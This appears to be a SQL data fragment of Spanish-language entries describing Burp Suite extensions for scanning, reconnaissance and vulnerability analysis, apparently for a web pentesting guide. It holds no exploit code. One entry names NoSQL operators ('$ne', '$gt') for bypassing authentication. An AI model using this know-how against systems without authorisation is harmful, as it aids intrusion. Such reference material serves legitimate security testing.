(30, 'Escáneres: ActiveScanPlusPlus', '## Escaneo Activo Mejorado\n\nExtiende el escáner nativo de Burp. Busca vulnerabilidades avanzadas como Cache Poisoning, Host Header Attacks y XML input handling raros.', 1),

(30, 'Escáneres: additional-scanner-checks', '## Chequeos Extra\n\nAñade firmas pasivas para detectar DOM XSS conocidos, problemas de CORS, y cabeceras de seguridad faltantes que el escáner por defecto a veces omite.', 2),

(30, 'Escáneres: backslash-powered-scanner', '## Inyecciones Complejas\n\nLa mejor herramienta para detectar **Server-Side Template Injection (SSTI)** y vulnerabilidades de inyección en el backend que no son SQL estándar. Detecta anomalías en el manejo de caracteres especiales.', 3),

(30, 'Recopilación de información: filter-options-method', '## Análisis de Métodos HTTP\n\nAyuda a identificar y probar métodos HTTP inusuales (`PUT`, `DELETE`, `TRACE`) que podrían estar habilitados y mal configurados.', 4),

(30, 'Recopilación de información: Admin-Panel_Finder', '## Fuzzing de Paneles\n\nAutomatiza la búsqueda de interfaces administrativas usando una lista curada de rutas comunes. Útil para no configurar Gobuster manualmente.', 5),

(30, 'Recopilación de información: BigIPDiscover', '## F5 BIG-IP Recon\n\nDetecta si el servidor está detrás de un balanceador F5 BIG-IP y trata de identificar versiones o cookies de persistencia internas para mapear la red interna.', 6),

(30, 'Recopilación de información: PwnBack', '## Wayback Machine Integration\n\nConsulta automáticamente `archive.org` para encontrar URLs históricas del dominio objetivo. Excelente para encontrar endpoints de API viejos y olvidados.', 7),

(30, 'Análisis de vulnerabilidades: Burp-NoSQLiScanner', '## Inyección NoSQL\n\nEscáner especializado para bases de datos como MongoDB. Intenta inyectar payloads JSON y operadores NoSQL (`$ne`, `$gt`) para bypasear autenticación.', 8);
